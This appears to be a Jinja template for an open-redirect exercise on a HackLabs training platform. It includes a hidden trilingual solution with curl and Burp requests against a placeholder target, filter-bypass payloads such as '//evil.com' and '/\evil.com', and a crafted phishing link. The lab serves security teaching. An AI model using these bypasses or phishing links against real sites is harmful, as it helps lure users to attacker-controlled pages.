@@ -1,0 +1,138 @@
+{% extends "base.html" %}
+{% block title %}V15 – Open Redirect – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="open_redirect_obj_desc">El parámetro url redirige sin validar el destino. Fuerza una redirección a un dominio externo: cuando lo logras, el servidor añade la flag en la cabecera de respuesta X-HackLabs-Flag.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>HL{···}</code> <span data-i18n="obj_flag_hint">— valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <div class="text-xs text-gray-500 dark:text-gray-400 mb-4" data-i18n="or_desc">
+      Este portal redirige a los usuarios tras completar acciones. El parámetro de destino no está validado.
+    </div>
+    <form method="GET" action="/open_redirect" class="space-y-4">
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_target_url">URL de destino</label>
+        <input type="text" name="url" placeholder="https://ejemplo.com/dashboard"
+               data-i18n-placeholder="ph_redirect_url"
+               class="hl-input font-mono" autocomplete="off" />
+      </div>
+      <button type="submit" class="btn-primary">
+        <i class="ph ph-arrow-right text-sm"></i> <span data-i18n="btn_go">Ir a destino</span>
+      </button>
+    </form>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Pasos de explotación</h3>
+    <ol>
+      <li>Identifica el endpoint vulnerable: <code>/open_redirect?url=</code> acepta una URL y redirige al usuario a ella.</li>
+      <li>Comprueba la redirección con curl:
+        <pre>curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"</pre>
+        Busca la cabecera <code>Location: https://evil.com</code> en la respuesta HTTP 302.</li>
+      <li><strong>Easy:</strong> No hay filtro — cualquier URL externa funciona:
+        <pre>/open_redirect?url=https://evil.com</pre></li>
+      <li><strong>Medium:</strong> Bloquea URLs que empiecen con <code>http://</code> o <code>https://</code> externo. Bypass con protocol-relative:
+        <pre># Protocol-relative — el navegador redirige a http://evil.com
+/open_redirect?url=//evil.com
+
+# Backslash — el navegador normaliza \ a / → //evil.com
+/open_redirect?url=/\evil.com</pre></li>
+      <li><strong>Hard:</strong> Bloquea dominios externos + protocol-relative (<code>//</code>). Bypass con backslash:
+        <pre># El filtro comprueba startswith("//") pero no "/\\"
+# El navegador normaliza \ a / → Location: //evil.com → redirect externo
+/open_redirect?url=/\evil.com</pre></li>
+      <li>Verifica en Burp Suite Repeater:
+        <pre>GET /open_redirect?url=/\evil.com HTTP/1.1
+Host: TARGET_IP
+
+# Respuesta: HTTP 302 Location: /\evil.com
+# El navegador normaliza a //evil.com → redirect a evil.com</pre></li>
+      <li>Construye un enlace de phishing creíble:
+        <pre>http://TARGET_IP/open_redirect?url=//evil.com/login</pre>
+        La víctima ve el dominio de confianza y hace clic, pero termina en el sitio del atacante.</li>
+      <li>Obtén la flag dedicada validando la cabecera de respuesta cuando la redirección es externa:
+        <pre>curl -I "{{ target_base }}/open_redirect?url=//evil.com"
+# X-HackLabs-Flag: HL{···}</pre></li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Browser DevTools</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Exploitation Steps</h3>
+    <ol>
+      <li>Identify the vulnerable endpoint: <code>/open_redirect?url=</code> takes a URL and redirects the user.</li>
+      <li>Verify the redirect with curl:
+        <pre>curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"</pre>
+        Look for the <code>Location: https://evil.com</code> header in the HTTP 302 response.</li>
+      <li><strong>Easy:</strong> No filter — any external URL works:
+        <pre>/open_redirect?url=https://evil.com</pre></li>
+      <li><strong>Medium:</strong> Blocks URLs starting with external <code>http://</code> or <code>https://</code>. Bypass with protocol-relative:
+        <pre># Protocol-relative — browser redirects to http://evil.com
+/open_redirect?url=//evil.com
+
+# Backslash — browser normalizes \ to / → //evil.com
+/open_redirect?url=/\evil.com</pre></li>
+      <li><strong>Hard:</strong> Blocks external domains + protocol-relative (<code>//</code>). Bypass with backslash:
+        <pre># Filter checks startswith("//") but not "/\\"
+# Browser normalizes \ to / → Location: //evil.com → external redirect
+/open_redirect?url=/\evil.com</pre></li>
+      <li>Verify in Burp Suite Repeater:
+        <pre>GET /open_redirect?url=/\evil.com HTTP/1.1
+Host: TARGET_IP
+
+# Response: HTTP 302 Location: /\evil.com
+# Browser normalizes to //evil.com → redirects to evil.com</pre></li>
+      <li>Craft a convincing phishing link:
+        <pre>http://TARGET_IP/open_redirect?url=//evil.com/login</pre>
+        The victim sees the trusted domain and clicks, but ends up on the attacker's site.</li>
+      <li>Get the dedicated flag by checking the response header when the redirect is external:
+        <pre>curl -I "{{ target_base }}/open_redirect?url=//evil.com"
+# X-HackLabs-Flag: HL{···}</pre></li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Browser DevTools</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Passos de exploração</h3>
+    <ol>
+      <li>Identifique o endpoint vulnerável: <code>/open_redirect?url=</code> recebe uma URL e redireciona o usuário.</li>
+      <li>Verifique o redirecionamento com o curl:
+        <pre>curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"</pre>
+        Procure pelo cabeçalho <code>Location: https://evil.com</code> na resposta HTTP 302.</li>
+      <li><strong>Fácil:</strong> Sem filtro — qualquer URL externa funciona:
+        <pre>/open_redirect?url=https://evil.com</pre></li>
+      <li><strong>Médio:</strong> Bloqueia URLs que comecem com <code>http://</code> ou <code>https://</code> externo. Bypass com protocol-relative:
+        <pre># Protocol-relative — o navegador redireciona para http://evil.com
+/open_redirect?url=//evil.com
+
+# Backslash — o navegador normaliza \ para / → //evil.com
+/open_redirect?url=/\evil.com</pre></li>
+      <li><strong>Difícil:</strong> Bloqueia domínios externos + protocol-relative (<code>//</code>). Bypass com backslash:
+        <pre># O filtro verifica startswith("//"), mas não "/\\"
+# O navegador normaliza \ para / → Location: //evil.com → redirecionamento externo
+/open_redirect?url=/\evil.com</pre></li>
+      <li>Verifique no Burp Suite Repeater:
+        <pre>GET /open_redirect?url=/\evil.com HTTP/1.1
+Host: TARGET_IP
+
+# Resposta: HTTP 302 Location: /\evil.com
+# O navegador normaliza para //evil.com → redireciona para evil.com</pre></li>
+      <li>Monte um link de phishing convincente:
+        <pre>http://TARGET_IP/open_redirect?url=//evil.com/login</pre>
+        A vítima vê o domínio confiável e clica, mas acaba no site do atacante.</li>
+      <li>Obtenha a flag dedicada verificando o cabeçalho de resposta quando o redirecionamento for externo:
+        <pre>curl -I "{{ target_base }}/open_redirect?url=//evil.com"
+# X-HackLabs-Flag: HL{···}</pre></li>
+    </ol>
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Browser DevTools</span></div>
+  </div>
+</div>
+{% endblock %}
